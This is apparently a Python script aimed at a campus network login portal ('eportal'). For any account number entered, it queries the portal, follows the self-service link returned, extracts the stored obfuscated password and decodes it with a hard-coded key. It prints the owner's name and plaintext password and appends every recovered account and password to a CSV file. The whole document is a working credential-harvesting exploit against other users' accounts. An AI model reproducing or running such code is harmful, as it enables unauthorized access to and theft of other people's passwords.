import requests
import re
while True:
    
    hao=input("请输入你要登陆的账号")
    url='http://192.168.9.18:801/eportal/?c=Portal&a=self&callback=dr1003&self_type=1&user_account='+hao+'&user_password=www&wlan_user_mac=50642baa65d7&wlan_user_ip=10.252.27.108&jsVersion=3.3.3&v=741'
    headers={
        "Accept":"*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection":"close",
        "Host":    "192.168.9.18:801",
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0"
    }
    respone=requests.get(url,timeout=10,headers=headers)
    a=respone.content

    a=str(a)
    a=a.replace('\\\\/','/')
    a=a.replace('\\/','/')
    pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+') # 匹配模式
    url1 = re.findall(pattern,a)
    respone1=requests.get(url1[0],timeout=10)
    c=respone1.text
    d=re.findall(r'"userRealName":....',c)
    pwdmi=re.findall(r'ssword":"(.*)","userRealName"',c)
    
    

    passwd =[] 
    passwd = [28, 57, 86, 19, 47, 76, 9, 38, 66, 95, 28, 57, 86, 18, 47, 76, 9, 38, 66, 95, 28, 57, 86, 38, 66, 95, 28, 57, 86, 18, 47, 76, 9, 38, 66, 95, 28, 57, 86]
    milist=[]
    
    pwd=''
    for i in pwdmi[0]:
        
        milist.append(i)

    e=[]
    f=[]
    g=[]
    k=0
    for i in range(len(milist)):
        try:
            if (milist[k]=="\\"):
                k+=1
        except:
            break
        aaa=int(ord(milist[k]))-int(passwd[i])
        k+=1
        if (aaa<32):
            aaa+=95
        pwd=pwd+chr(aaa)
    

    
    try:
        print(d[0][-3::]+"，已登录")
        print('\n')
        print('密码为',pwd[:-1])
    except:
        print("登陆失败")
    print('\n')
    print("登陆链接为")
    print(url1[0])
    with open(r'密码.csv','a',encoding='utf-8-sig') as f:
                    f.write('{},{}\n'.format(hao,pwd[:-1]))


